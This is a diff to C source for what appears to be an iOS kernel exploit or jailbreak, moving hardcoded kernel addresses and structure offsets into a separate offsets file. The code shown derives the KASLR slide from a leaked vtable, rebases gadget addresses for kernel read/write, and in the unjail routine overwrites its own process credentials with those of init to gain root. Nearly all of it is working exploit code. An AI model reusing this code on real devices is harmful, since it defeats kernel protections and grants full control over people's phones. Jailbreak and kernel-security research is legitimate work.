@@ -15,6 +15,8 @@
 
 #include <CoreFoundation/CoreFoundation.h>
 
+#include "offsets.h"
+
 // IOKit stuff
 
 #define kIOMasterPortDefault MACH_PORT_NULL
@@ -582,13 +584,13 @@ uint64_t prepare_kernel_rw() {
   uint64_t vtable = buf[0];
   
   // rebase the symbols
-  kaslr_shift = vtable - 0xfffffff006f83d38;
+  kaslr_shift = vtable - AGXCommandQueue_vtable;
   
   kernel_base = 0xFFFFFFF007004000 + kaslr_shift;
-  get_metaclass = 0xfffffff00747ad9c + kaslr_shift;
-  osserializer_serialize = 0xfffffff0074916b4 + kaslr_shift;
-  ret = 0xfffffff00747ada4 + kaslr_shift;
-  kernel_uuid_copy = 0xfffffff00749ca6c + kaslr_shift;
+  get_metaclass = OSData_getMetaClass + kaslr_shift;
+  osserializer_serialize = OSSerializer_serialize + kaslr_shift;
+  ret = OSData_getMetaClass + 8 + kaslr_shift;
+  kernel_uuid_copy = k_uuid_copy + kaslr_shift;
   
   // save the port and userclient so we can use them for the r/w
   oob_port = first_port;
@@ -603,6 +605,8 @@ uint64_t prepare_kernel_rw() {
 }
 
 int jb_go() {
+  int rv = init_offsets();
+  if (rv) return rv;
   uint64_t kernel_base = prepare_kernel_rw();
 #if 0
   uint64_t val = rk64(kernel_base);
@@ -623,22 +627,6 @@ int jb_go() {
 }
 
 /*****************************************************************************/
-
-const unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
-const unsigned offsetof_task = 0x18;                // proc_t::task
-const unsigned offsetof_p_ucred = 0x100;            // proc_t::p_ucred
-const unsigned offsetof_p_csflags = 0x2a8;          // proc_t::p_csflags
-const unsigned offsetof_itk_self = 0xD8;            // task_t::itk_self (convert_task_to_port)
-const unsigned offsetof_itk_sself = 0xE8;           // task_t::itk_sself (task_get_special_port)
-const unsigned offsetof_itk_bootstrap = 0x2b8;      // task_t::itk_bootstrap (task_get_special_port)
-const unsigned offsetof_ip_mscount = 0x9C;          // ipc_port_t::ip_mscount (ipc_port_make_send)
-const unsigned offsetof_ip_srights = 0xA0;          // ipc_port_t::ip_srights (ipc_port_make_send)
-const unsigned offsetof_special = 2 * sizeof(long); // host::special
-
-const uint64_t allproc = 0xfffffff0075f0178;
-const uint64_t realhost = 0xfffffff00757c898;
-const uint64_t surfacevt = 0xfffffff006e521e0;
-const uint64_t call5 = 0xfffffff006337e10;
 
 mach_port_t tfp0 = 0;
 
@@ -861,7 +849,7 @@ unjail(void)
     uint64_t init_cred = kread_uint64(init_proc + offsetof_p_ucred);
     kwrite_uint64(our_proc + offsetof_p_ucred, init_cred);
 
-#if 1
+#if 0
     uint64_t val = kread_uint64(kernel_base);
     printf("read from kernel memory: 0x%016llx\n", val);
 #else
